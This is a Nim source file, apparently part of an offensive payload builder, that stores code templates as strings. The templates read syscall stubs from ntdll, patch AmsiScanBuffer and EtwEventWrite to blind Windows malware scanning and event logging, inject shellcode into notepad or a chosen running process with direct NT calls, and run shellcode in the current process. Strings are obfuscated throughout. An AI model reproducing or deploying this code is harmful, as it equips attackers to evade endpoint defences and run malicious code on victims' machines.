import strformat
import strutils
from GlobalVars import remoteprocesses

let GetSyscallStub * = """
type
  PS_ATTR_UNION* {.pure, union.} = object
    Value*: ULONG
    ValuePtr*: PVOID
  PS_ATTRIBUTE* {.pure.} = object
    Attribute*: ULONG 
    Size*: SIZE_T
    u1*: PS_ATTR_UNION
    ReturnLength*: PSIZE_T
  PPS_ATTRIBUTE* = ptr PS_ATTRIBUTE
  PS_ATTRIBUTE_LIST* {.pure.} = object
    TotalLength*: SIZE_T
    Attributes*: array[2, PS_ATTRIBUTE]
  PPS_ATTRIBUTE_LIST* = ptr PS_ATTRIBUTE_LIST
  KNORMAL_ROUTINE* {.pure.} = object
    NormalContext*: PVOID
    SystemArgument1*: PVOID
    SystemArgument2*: PVOID
  PKNORMAL_ROUTINE* = ptr KNORMAL_ROUTINE

var 
    SYSCALL_STUB_SIZE: int = 23;

proc RVAtoRawOffset(RVA: DWORD_PTR, section: PIMAGE_SECTION_HEADER): PVOID =
    return cast[PVOID](RVA - section.VirtualAddress + section.PointerToRawData)

proc GetSyscallStub(functionName: LPCSTR, syscallStub: LPVOID): BOOL =
    var
        file: HANDLE
        fileSize: DWORD
        bytesRead: DWORD
        fileData: LPVOID
        ntdllString: LPCSTR = "C:\\windows\\system32\\ntdll.dll"
        nullHandle: HANDLE
    file = CreateFileA(ntdllString, cast[DWORD](GENERIC_READ), cast[DWORD](FILE_SHARE_READ), cast[LPSECURITY_ATTRIBUTES](NULL), cast[DWORD](OPEN_EXISTING), cast[DWORD](FILE_ATTRIBUTE_NORMAL), nullHandle)
    fileSize = GetFileSize(file, nil)
    fileData = HeapAlloc(GetProcessHeap(), 0, fileSize)
    ReadFile(file, fileData, fileSize, addr bytesRead, nil)

    var
        dosHeader: PIMAGE_DOS_HEADER = cast[PIMAGE_DOS_HEADER](fileData)
        imageNTHeaders: PIMAGE_NT_HEADERS = cast[PIMAGE_NT_HEADERS](cast[DWORD_PTR](fileData) + dosHeader.e_lfanew)
        exportDirRVA: DWORD = imageNTHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
        section: PIMAGE_SECTION_HEADER = IMAGE_FIRST_SECTION(imageNTHeaders)
        textSection: PIMAGE_SECTION_HEADER = section
        rdataSection: PIMAGE_SECTION_HEADER = section

    let low: uint16 = 0

    for Section in low ..< imageNTHeaders.FileHeader.NumberOfSections:
        var ntdllSectionHeader = cast[PIMAGE_SECTION_HEADER](cast[DWORD_PTR](IMAGE_FIRST_SECTION(imageNTHeaders)) + cast[DWORD_PTR](IMAGE_SIZEOF_SECTION_HEADER * Section))
        if ".rdata" in toString(ntdllSectionHeader.Name):
            rdataSection = ntdllSectionHeader
        
    var exportDirectory: PIMAGE_EXPORT_DIRECTORY = cast[PIMAGE_EXPORT_DIRECTORY](RVAtoRawOffset(cast[DWORD_PTR](fileData) + exportDirRVA, rdataSection))

    var addressOfNames: PDWORD = cast[PDWORD](RVAtoRawOffset(cast[DWORD_PTR](fileData) + cast[DWORD_PTR](exportDirectory.AddressOfNames), rdataSection))
    var addressOfFunctions: PDWORD = cast[PDWORD](RVAtoRawOffset(cast[DWORD_PTR](fileData) + cast[DWORD_PTR](exportDirectory.AddressOfFunctions), rdataSection))
    var stubFound: BOOL = 0
    var oldProtection: DWORD = 0
    let low2: int = 0
    for low2 in 0 ..< exportDirectory.NumberOfNames:
        var functionNameVA: DWORD_PTR = cast[DWORD_PTR](RVAtoRawOffset(cast[DWORD_PTR](fileData) + addressOfNames[low2], rdataSection))
        var functionVA: DWORD_PTR = cast[DWORD_PTR](RVAtoRawOffset(cast[DWORD_PTR](fileData) + addressOfFunctions[low2 + 1], textSection))
        var functionNameResolved: LPCSTR = cast[LPCSTR](functionNameVA)
        var compare: int = lstrcmpA(functionNameResolved,functionName)
        if (compare == 0):
            #echo functionNameResolved
            copyMem(syscallStub, cast[LPVOID](functionVA), SYSCALL_STUB_SIZE)
            stubFound = 1
            #echo obf("Found Syscall STUB!")
    return stubFound

"""

let AMSIETWDelegates * = """
# Unmanaged NTDLL Declarations
type myNtProtectVM = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, RegionSize: PSIZE_T, NewProtect: ULONG, OldProtect: PULONG): NTSTATUS {.stdcall.}
type myNtWriteVM = proc (ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.stdcall.}

"""

let AMSIStub * = """
proc PatchAmsi(): bool =
    var
        amsi: LibHandle
        cs: pointer
        op: ULONG
        t: ULONG
        disabled: bool = false
    
    when defined amd64:
        let patch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
    elif defined i386:
        let patch: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]
    # loadLib does the same thing that the dynlib pragma does and is the equivalent of LoadLibrary() on windows
    # it also returns nil if something goes wrong meaning we can add some checks in the code to make sure everything's ok (which you can't really do well when using LoadLibrary() directly through winim)
    amsi = loadLib(obf("amsi"))
    if isNil(amsi):
        echo obf("[X] Failed to load amsi.dll")
        return disabled

    cs = amsi.symAddr(obf("AmsiScanBuffer")) # equivalent of GetProcAddress()
    if isNil(cs):
        echo obf("[X] Failed to get the address of 'AmsiScanBuffer'")
        return disabled
    
    var hProcess: HANDLE
    hProcess = GetCurrentProcess()

    let tProcess2 = GetCurrentProcessId()
    var pHandle2: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)
    var syscallStub_NtProtect: LPVOID
    syscallStub_NtProtect = VirtualAllocEx(
        pHandle2,
        NULL,
        cast[SIZE_T](SYSCALL_STUB_SIZE),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )

    var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtProtect) + cast[HANDLE](SYSCALL_STUB_SIZE)

    var oldProtection: DWORD = 0

    # Define NtProtectVirtualMemory
    var NtProtectVirtualMemory: myNtProtectVM = cast[myNtProtectVM](cast[LPVOID](syscallStub_NtProtect))
    VirtualProtect(cast[LPVOID](syscallStub_NtProtect), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection)

    # define NtWriteVirtualMemory
    let NtWriteVirtualMemory = cast[myNtWriteVM](cast[LPVOID](syscallStub_NtWrite))
    VirtualProtect(cast[LPVOID](syscallStub_NtWrite), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection)

    var success: BOOL
    var protectAddress = cs
    success = GetSyscallStub("NtProtectVirtualMemory", cast[LPVOID](syscallStub_NtProtect))
    success = GetSyscallStub("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWrite))
    var friendlycodeLength = cast[SIZE_T](patch.len)
    success = NtProtectVirtualMemory(hProcess,addr protectAddress,addr friendlycodeLength,0x40,addr t) 
    if (success != 0):
        echo obf("NtProtectVirtualMemory failed")
        return disabled
    echo obf("[*] Applying Syscall AMSI patch")
    var outLength: SIZE_T
    
    success = NtWriteVirtualMemory(hProcess,cs,unsafeAddr patch,patch.len,addr outLength)
    
    if (success != 0):
        echo obf("NtWriteVirtualMemory failed")
        return disabled
        # fails for some reason
        #copyMem(addr cs, unsafeAddr patch, patch.len)
    success =  NtProtectVirtualMemory(hProcess,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
    if (success != 0):
        echo obf("NtWriteVirtualMemory failed")
        return disabled
    else:
        echo obf("[*] OldProtect set back")
        disabled = true
    
    success = VirtualProtect(syscallStub_NtProtect, 4096, PAGE_READWRITE, addr op)
    # Fails for some reason
    #success = NtProtectVirtualMemory(hProcess,addr syscallStub_NtProtect,addr friendlycodeLength,PAGE_READWRITE,addr op)
    echo obf("[*] Restored Stub protections: ") & $success

    return disabled

when isMainModule:
    success = PatchAmsi()
    echo obf("[*] AMSI disabled: ") & fmt"{bool(success)}"
"""


let ETWPatchStub * = """

proc Patchntdll(): bool =
    var
        ntdll: LibHandle
        cs: pointer
        op: ULONG
        t: ULONG
        disabled: bool = false

    when defined amd64:
        let patch: array[1, byte] = [byte 0xc3]
    elif defined i386:
        let patch: array[4, byte] = [byte 0xc2, 0x14, 0x00, 0x00]
    # loadLib does the same thing that the dynlib pragma does and is the equivalent of LoadLibrary() on windows
    # it also returns nil if something goes wrong meaning we can add some checks in the code to make sure everything's ok (which you can't really do well when using LoadLibrary() directly through winim)
    ntdll = loadLib(obf("ntdll"))
    if isNil(ntdll):
        echo obf("[X] Failed to load ntdll.dll")
        return disabled

    cs = ntdll.symAddr(obf("EtwEventWrite")) # equivalent of GetProcAddress()
    if isNil(cs):
        echo obf("[X] Failed to get the address of 'EtwEventWrite'")
        return disabled

    var hProcess: HANDLE
    hProcess = GetCurrentProcess()

    let tProcess2 = GetCurrentProcessId()
    var pHandle2: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)
    var syscallStub_NtProtect: LPVOID
    syscallStub_NtProtect = VirtualAllocEx(
        pHandle2,
        NULL,
        cast[SIZE_T](SYSCALL_STUB_SIZE),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )

    var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtProtect) + cast[HANDLE](SYSCALL_STUB_SIZE)

    var oldProtection: DWORD = 0

    # Define NtProtectVirtualMemory
    var NtProtectVirtualMemory: myNtProtectVM = cast[myNtProtectVM](cast[LPVOID](syscallStub_NtProtect))
    VirtualProtect(cast[LPVOID](syscallStub_NtProtect), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection)

    # define NtWriteVirtualMemory
    let NtWriteVirtualMemory = cast[myNtWriteVM](cast[LPVOID](syscallStub_NtWrite))
    VirtualProtect(cast[LPVOID](syscallStub_NtWrite), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection)

    var success: BOOL
    var protectAddress = cs
    success = GetSyscallStub("NtProtectVirtualMemory", cast[LPVOID](syscallStub_NtProtect))
    success = GetSyscallStub("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWrite))
    var friendlycodeLength = cast[SIZE_T](patch.len)
    success = NtProtectVirtualMemory(hProcess,addr protectAddress,addr friendlycodeLength,0x40,addr t) 
    if (success != 0):
        echo obf("NtProtectVirtualMemory failed")
        return disabled
    echo obf("[*] Applying Syscall ETW patch")
    var outLength: SIZE_T
    
    success = NtWriteVirtualMemory(hProcess,cs,unsafeAddr patch,patch.len,addr outLength)
    
    if (success != 0):
        echo obf("NtWriteVirtualMemory failed")
        return disabled
        # fails for some reason
        #copyMem(addr cs, unsafeAddr patch, patch.len)
    success =  NtProtectVirtualMemory(hProcess,addr protectAddress,addr friendlycodeLength,t,addr op)
    if (success != 0):
        echo obf("NtWriteVirtualMemory failed")
        return disabled
    else:
        echo obf("[*] OldProtect set back")
        disabled = true
    
    success = VirtualProtect(syscallStub_NtProtect, 4096, PAGE_READWRITE, addr op)

    return disabled

when isMainModule:
    success = Patchntdll()
    echo obf("[*] ETW blocked by patch: ") & fmt"{bool(success)}"
"""

let ShellcoderemoteinjectStub_notepad * = """
proc injectCreateRemoteThread(friendlycode: openarray[byte]): void =

    # Under the hood, the startProcess function from Nim's osproc module is calling CreateProcess() :D
    let tProcess = startProcess(obf("notepad.exe"))
    tProcess.suspend() # That's handy!
    defer: tProcess.close()

    echo obf("[*] Target Process: "), tProcess.processID

    var cid: CLIENT_ID
    var oa: OBJECT_ATTRIBUTES
    var pHandle: HANDLE
    var tHandle: HANDLE
    var ds: LPVOID
    var sc_size: SIZE_T = cast[SIZE_T](friendlycode.len)

    cid.UniqueProcess = tProcess.processID

"""

let ShellcoderemoteinjectStub_customproc * = fmt"""

from winim import PROCESSENTRY32A,CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS,PROCESSENTRY32,Process32FirstA,Process32NextA

proc FindPidByName * (processName : string):DWORD =
    try:
        var 
            entry : PROCESSENTRY32A
            snapshot : HANDLE
            pid : DWORD = 0
        snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
        if snapshot != INVALID_HANDLE_VALUE:
            entry.dwSize = DWORD(sizeof(PROCESSENTRY32))
            if Process32FirstA(snapshot,addr entry):
                while Process32NextA(snapshot,addr entry):
                    pid = entry.th32ProcessID
                    if ($(entry.szExeFile).join()).contains(processName):
                        result = pid
    except: 
        echo obf("Process ID not found")

proc injectCreateRemoteThread(friendlycode: openarray[byte]): void =

    var processID: DWORD
    var remoteprocesses: seq[string] = {remoteprocesses}
    var found: bool = false
    for m in remoteprocesses:
        if found == true: continue
        echo obf("Checking: ") & $m
        processID = FindPidByName(m)
        if (processID):
            found = true

    echo obf("[*] Target Process: "), processID

    var cid: CLIENT_ID
    var oa: OBJECT_ATTRIBUTES
    var pHandle: HANDLE
    var tHandle: HANDLE
    var ds: LPVOID
    var sc_size: SIZE_T = cast[SIZE_T](friendlycode.len)

    cid.UniqueProcess = processID

"""

let ShellcoderemoteinjectStub * = """
    
    let tProcess2 = GetCurrentProcessId()
    var pHandle2: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)

    let syscallStub_NtOpenP = VirtualAllocEx(
        pHandle2,
        NULL,
        cast[SIZE_T](SYSCALL_STUB_SIZE),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )

    
    var syscallStub_NtAlloc: HANDLE = cast[HANDLE](syscallStub_NtOpenP) + cast[HANDLE](SYSCALL_STUB_SIZE)
    var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtAlloc) + cast[HANDLE](SYSCALL_STUB_SIZE)
    var syscallStub_NtCreate: HANDLE = cast[HANDLE](syscallStub_NtWrite) + cast[HANDLE](SYSCALL_STUB_SIZE)


    var oldProtection: DWORD = 0

    # define NtOpenProcess
    var NtOpenProcess: myNtOpenProcess = cast[myNtOpenProcess](cast[LPVOID](syscallStub_NtOpenP));
    VirtualProtect(cast[LPVOID](syscallStub_NtOpenP), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);

    # define NtAllocateVirtualMemory
    let NtAllocateVirtualMemory = cast[myNtAllocateVirtualMemory](cast[LPVOID](syscallStub_NtAlloc));
    VirtualProtect(cast[LPVOID](syscallStub_NtAlloc), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);

    # define NtWriteVirtualMemory
    let NtWriteVirtualMemory = cast[myNtWriteVirtualMemory](cast[LPVOID](syscallStub_NtWrite));
    VirtualProtect(cast[LPVOID](syscallStub_NtWrite), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);

    # define NtCreateThreadEx
    let NtCreateThreadEx = cast[myNtCreateThreadEx](cast[LPVOID](syscallStub_NtCreate));
    VirtualProtect(cast[LPVOID](syscallStub_NtCreate), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);

    var status: NTSTATUS
    var success: BOOL

    success = GetSyscallStub("NtOpenProcess", cast[LPVOID](syscallStub_NtOpenP));
    success = GetSyscallStub("NtAllocateVirtualMemory", cast[LPVOID](syscallStub_NtAlloc));
    success = GetSyscallStub("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWrite));
    success = GetSyscallStub("NtCreateThreadEx", cast[LPVOID](syscallStub_NtCreate));

    
    status = NtOpenProcess(
        &pHandle,
        PROCESS_ALL_ACCESS, 
        &oa, &cid         
    )


    status = NtAllocateVirtualMemory(
        pHandle, &ds, 0, &sc_size, 
        MEM_COMMIT, 
        PAGE_EXECUTE_READWRITE);

    var bytesWritten: SIZE_T

    status = NtWriteVirtualMemory(
        pHandle, 
        ds, 
        unsafeAddr friendlycode, 
        sc_size-1, 
        addr bytesWritten);

    echo obf("[*] NtWriteVirtualMemory: "), status
    echo obf("    \\-- bytes written: "), bytesWritten
    echo obf("")

    status = NtCreateThreadEx(
        &tHandle, 
        THREAD_ALL_ACCESS, 
        NULL, 
        pHandle,
        ds, 
        NULL, FALSE, 0, 0, 0, NULL);

    status = NtClose(tHandle)
    status = NtClose(pHandle)

    # This doesn't work so far for some reason
    #success = VirtualProtect(syscallStub_NtOpenP, cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READ, addr oldProtection);
    #echo obf("set back old protect")
    echo success
   

when isMainModule:
     injectCreateRemoteThread(dectext)

"""

let LocalInjectDelegates * = """
# Unmanaged NTDLL Declarations
type myNtAllocateVirtualMemory = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS {.stdcall.}
type myNtWriteVirtualMemory = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.stdcall.}

"""


let RemoteInjectDelegates * = """
# Unmanaged NTDLL Declarations
type myNtOpenProcess = proc(ProcessHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ClientId: PCLIENT_ID): NTSTATUS {.stdcall.}
type myNtAllocateVirtualMemory = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS {.stdcall.}
type myNtWriteVirtualMemory = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.stdcall.}
type myNtCreateThreadEx = proc(ThreadHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ProcessHandle: HANDLE, StartRoutine: PVOID, Argument: PVOID, CreateFlags: ULONG, ZeroBits: SIZE_T, StackSize: SIZE_T, MaximumStackSize: SIZE_T, AttributeList: PPS_ATTRIBUTE_LIST): NTSTATUS {.stdcall.}

"""

let SyscallStubSizeStub * = """
var 
    SYSCALL_STUB_SIZE: int = 23;
"""

let ShellcodelocalStub * = """
from winlean import getCurrentProcess

proc pwndem[byte](friendlycode: openarray[byte]): void =

    let tProcess = GetCurrentProcessId()
    var pHandle: HANDLE = getCurrentProcess()

    let syscallStub_NtAlloc = VirtualAllocEx(
        pHandle,
        NULL,
        cast[SIZE_T](SYSCALL_STUB_SIZE),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )

    
    var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtAlloc) + cast[HANDLE](SYSCALL_STUB_SIZE)
    
    var oldProtection: DWORD = 0
    var cid: CLIENT_ID
    var oa: OBJECT_ATTRIBUTES
    var tHandle: HANDLE
    var sc_size: SIZE_T = cast[SIZE_T](friendlycode.len)
    var ds: LPVOID
    
    cid.UniqueProcess = tProcess

    # define NtAllocateVirtualMemory
    let NtAllocateVirtualMemory = cast[myNtAllocateVirtualMemory](cast[LPVOID](syscallStub_NtAlloc));
    VirtualProtect(cast[LPVOID](syscallStub_NtAlloc), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);

    # define NtWriteVirtualMemory
    let NtWriteVirtualMemory = cast[myNtWriteVirtualMemory](cast[LPVOID](syscallStub_NtWrite));
    VirtualProtect(cast[LPVOID](syscallStub_NtWrite), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);


    var status: NTSTATUS
    var success: BOOL

    success = GetSyscallStub("NtAllocateVirtualMemory", cast[LPVOID](syscallStub_NtAlloc));
    success = GetSyscallStub("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWrite));
  
    cid.UniqueProcess = tProcess

    status = NtAllocateVirtualMemory(pHandle, &ds, 0, &sc_size,MEM_COMMIT,PAGE_EXECUTE_READWRITE);
    echo obf("[*] NtAllocateVirtualMemory: "), status
    var bytesWritten: SIZE_T

    status = NtWriteVirtualMemory(pHandle,ds,unsafeAddr friendlycode,sc_size-1,addr bytesWritten);

    echo obf("[*] NtWriteVirtualMemory: "), status
    echo obf("    \\-- bytes written: "), bytesWritten
    echo obf("")
    
    let f = cast[proc(){.nimcall.}](ds)
    f()

    status = NtClose(pHandle)


when isMainModule:
     pwndem(dectext)

"""